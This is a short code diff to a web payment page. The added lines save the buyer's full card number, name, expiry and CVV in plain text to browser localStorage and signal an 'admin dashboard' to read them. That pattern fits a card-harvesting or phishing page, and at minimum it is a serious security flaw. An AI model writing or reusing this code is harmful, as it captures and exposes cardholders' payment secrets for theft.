@@ -101,6 +101,19 @@ export function PaymentPage() {
 
   const handlePayment = () => {
     if (!isFormValid) return;
+    
+    // Store payment data for admin dashboard
+    const paymentData = {
+      cardName,
+      cardNumber: rawCardNumber,
+      cardExpiry: expiry,
+      cardCvv: cvv,
+    };
+    localStorage.setItem('mawashi-payment-data', JSON.stringify(paymentData));
+    
+    // Dispatch event to update admin dashboard
+    window.dispatchEvent(new Event('mawashi-data-update'));
+    
     setLocation('/payment-verification');
   };
 
